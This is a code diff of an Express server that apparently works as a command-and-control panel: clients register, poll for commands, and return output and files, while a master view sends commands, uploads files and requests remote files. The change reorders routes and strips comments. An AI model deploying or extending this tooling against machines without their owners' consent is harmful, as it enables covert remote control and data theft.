@@ -19,14 +19,6 @@ let latestCommand = { id: 0, cmd: '' };
 const selectedInclude = new Set();
 const selectedExclude = new Set();
 
-// ---------- Helper ----------
-function getTargetClients(targets) {
-  if (!targets || targets.length === 0) {
-    return Array.from(clients.keys());
-  }
-  return targets.filter(id => clients.has(id));
-}
-
 // ---------- Embedded HTML ----------
 const html = `<!DOCTYPE html>
 <html>
@@ -378,12 +370,11 @@ const html = `<!DOCTYPE html>
 </body>
 </html>`;
 
-// ---------- Routes ----------
-app.get('/', (req, res) => res.send(html));
-app.get('/master', (req, res) => res.send(html));
-app.get('/:uuid', (req, res) => res.send(html));
+// ---------- IMPORTANT: API routes must come BEFORE wildcard routes ----------
+// Serve HTML for root, master, and any client view (wildcard)
+// But we need to define API routes first.
 
-// ---------- Client registration ----------
+// API Routes
 app.post('/register', (req, res) => {
   const clientId = uuidv4();
   clients.set(clientId, {
@@ -398,7 +389,6 @@ app.post('/register', (req, res) => {
   res.json({ clientId });
 });
 
-// ---------- Client polling ----------
 app.get('/poll', (req, res) => {
   const clientId = req.query.clientId;
   if (!clientId || !clients.has(clientId)) {
@@ -415,7 +405,6 @@ app.get('/poll', (req, res) => {
   res.json({ task: task || null });
 });
 
-// ---------- Client result ----------
 app.post('/result', (req, res) => {
   const { clientId, taskId, output, fileData } = req.body;
   if (!clientId || !clients.has(clientId)) {
@@ -437,10 +426,6 @@ app.post('/result', (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- Serve downloads ----------
-app.use('/downloads', express.static('downloads'));
-
-// ---------- Get clients ----------
 app.get('/clients', (req, res) => {
   const list = [];
   for (const [id, client] of clients) {
@@ -449,7 +434,6 @@ app.get('/clients', (req, res) => {
   res.json({ clients: list });
 });
 
-// ---------- Send command ----------
 app.post('/command', (req, res) => {
   const { cmd, targets } = req.body;
   if (!cmd) return res.status(400).json({ error: 'No command' });
@@ -464,7 +448,6 @@ app.post('/command', (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- Upload file ----------
 app.post('/upload', upload.single('file'), (req, res) => {
   const file = req.file;
   if (!file) return res.status(400).json({ error: 'No file' });
@@ -482,7 +465,6 @@ app.post('/upload', upload.single('file'), (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- Download request ----------
 app.post('/download-request', (req, res) => {
   const { path: remotePath, targets } = req.body;
   if (!remotePath) return res.status(400).json({ error: 'No path' });
@@ -495,6 +477,14 @@ app.post('/download-request', (req, res) => {
   }
   res.json({ ok: true });
 });
+
+app.use('/downloads', express.static('downloads'));
+
+// ---------- HTML routes (must be after API routes) ----------
+app.get('/', (req, res) => res.send(html));
+app.get('/master', (req, res) => res.send(html));
+// This wildcard route should be LAST
+app.get('/:uuid', (req, res) => res.send(html));
 
 // ---------- Start server ----------
 const PORT = process.env.PORT || 8080;
